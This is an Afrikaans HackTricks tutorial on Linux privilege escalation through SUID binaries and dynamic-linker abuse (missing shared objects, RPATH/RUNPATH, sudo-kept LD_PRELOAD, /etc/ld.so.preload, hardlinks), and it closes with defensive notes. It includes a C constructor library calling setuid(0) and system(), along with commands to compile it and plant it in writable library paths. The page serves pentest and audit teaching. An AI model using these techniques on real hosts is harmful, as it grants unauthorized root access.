# SUID Shared Library en Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID-binaries word gewoonlik nagegaan vir direkte command execution, maar custom SUID-programme kan ook kwesbaar wees deur die dynamic linker. Die algemene tema is eenvoudig: ’n bevoorregte executable laai code vanaf ’n path of configuration wat ’n gebruiker met laer privileges kan beïnvloed.

Hierdie bladsy fokus op generiese technique patterns: ontbrekende libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` deur sudo, linker configuration, en SUID-hardlink confusion.

## Vinnige Enumerasie

Begin deur ongewone SUID-files te vind en te kontroleer of hulle dynamically linked is:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Fokus op nie-standaardliggings, pasgemaakte toepassingspaaie, binaries wat deur root besit word maar buite pakketbestuurde gidse is, en afhanklikhede wat vanaf skryfbare gidse gelaai word.

Nuttige skryfbaarheidstoetse:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Sommige pasgemaakte SUID-binêre lêers probeer om ’n shared object te laai wat nie bestaan nie. As die ontbrekende pad onder ’n gids is wat deur die aanvaller beheer word, kan die binêre lêer aanvaller-verskafde kode as die effektiewe gebruiker laai.

Vind mislukte biblioteekopsoeke:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
As die binary ’n skryfbare pad vir `libexample.so` deursoek, kan ’n minimale proof library ’n constructor gebruik. Hou die bewys van impak skadeloos tydens validering:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Bou dit met die presiese lêernaam wat die binêre lêer probeer laai:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Die uitbuitbare toestand is nie slegs die ontbrekende biblioteek nie. Die aanvaller moet ’n versoenbare shared object kan plaas by ’n pad wat die bevoorregte laaier sal aanvaar.

## Skryfbare Biblioteekgids

Soms bestaan alle afhanklikhede, maar een van die gidse wat gebruik word om dit op te los, is skryfbaar. Dit kan die vervanging van ’n gelaaide biblioteek of die plasing van ’n biblioteek met hoër prioriteit en dieselfde naam moontlik maak.

Hersien afhanklikheidspaaie:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Indien die gids skryfbaar is, valideer dit met ’n kopie-veilige benadering in ’n lab. Die vervanging van stelselbiblioteke op ’n aktiewe host kan authentication, package management of selflaai-kritieke dienste breek.

## RPATH en RUNPATH

`RPATH` en `RUNPATH` is dynamic-section-inskrywings wat vir die loader aandui waar om na biblioteke te soek. Hulle is gevaarlik in SUID-programme wanneer hulle na gidsse wys wat deur ’n aanvaller beskryfbaar is.

Bespeur hulle:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Voorbeeld van riskante uitvoer:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
As `/opt/app/lib` skryfbaar is en die binary `libcustom.so` benodig, kan die aanvaller moontlik ’n kwaadwillige `libcustom.so` daar plaas:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` en `RUNPATH` is nie identies in alle resolusiebesonderhede nie, maar vir privilege-escalation review is die praktiese vraag dieselfde: soek die SUID binary in ’n directory wat deur ’n attacker geskryf kan word na ’n library name?

## LD_PRELOAD, LD_LIBRARY_PATH en SUID

Vir normale programme kan `LD_PRELOAD` en `LD_LIBRARY_PATH` die laai van shared objects afdwing of beïnvloed. Vir SUID-programme gaan die dynamic loader normaalweg na secure-execution mode en ignoreer gevaarlike environment variables.

Dit beteken dat ’n gewone SUID binary gewoonlik nie kwesbaar is net omdat die user `LD_PRELOAD` kan stel nie:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Die algemene uitsondering is sudo-wanopstelling. As `sudo -l` wys dat ’n veranderlike soos `LD_PRELOAD` of `LD_LIBRARY_PATH` behou word, kan ’n opdrag wat deur sudo toegelaat word, aanvaller-beheerde kode laai:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Moenie hierdie gevalle verwar nie:

- `LD_PRELOAD` teenoor ’n normale SUID-binêre lêer: gewoonlik deur secure execution geblokkeer.
- `LD_PRELOAD` wat deur sudo behou word: moontlik uitbuitbaar.
- Ontbrekende `.so` in ’n skryfbare pad: uitbuitbaar wanneer die SUID-binêre lêer daardie pad natuurlik laai.
- `RPATH`/`RUNPATH` na ’n skryfbare gids: uitbuitbaar wanneer ’n nodige library beheer kan word.
- Skryftoegang tot `/etc/ld.so.preload` of linker-konfigurasie: stelselwyd en met ’n groot impak.

## Linker-konfigurasie

Die dynamic linker lees ook stelselkonfigurasie soos `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, die linker-cache, en in sommige gevalle `/etc/ld.so.preload`.

Kontroles met hoë waarde:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Skryfbare linker-konfigurasie is gewoonlik ernstiger as ’n enkele kwesbare SUID-binêre, omdat dit baie dinamies gekoppelde prosesse kan beïnvloed. `/etc/ld.so.preload` is veral gevaarlik omdat dit ’n shared object in bevoorregte prosesse kan forseer.

## SUID Hardlink Confusion

Hardlinks kan veroorsaak dat dieselfde SUID-inode onder verskeie name verskyn. Dit is nuttig om ’n bevoorregte helper weg te steek, opruiming te verwar of naïewe padgebaseerde hersiening te omseil.

Vind SUID-lêers met meer as een skakel:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspekteer alle paaie na dieselfde inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Die misbruik is nie dat ’n hardlink toestemmings verander nie. Die misbruik is padverwarring: ’n bevoorregte inode kan bereikbaar wees deur ’n naam wat verdedigers of skripte nie verwag nie. Vir ’n dieper verduideliking van inode- en hardlink-werkvloei, sien [Lêerstelsel, Inodes en Herstel](../main-system-information/filesystem-inodes-and-recovery.md).

## Verdedigingsnotas

- Hou SUID-binaries minimaal, geoudit en waar moontlik deur pakkette bestuur.
- Vermy `RPATH`-/`RUNPATH`-inskrywings wat na skryfbare of toepassingsbestuurde gidse wys.
- Hou biblioteekgidse in root se besit en nie-skryfbaar vir gewone gebruikers.
- Moenie `LD_PRELOAD`, `LD_LIBRARY_PATH` of soortgelyke loader-veranderlikes deur sudo behou nie.
- Monitor `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` en onverwagte SUID-lêers.
- Hersien hardlinked SUID-lêers en ondersoek pasgemaakte SUID-wrappers buite standaardstelselpaaie.
{{#include ../../banners/hacktricks-training.md}}
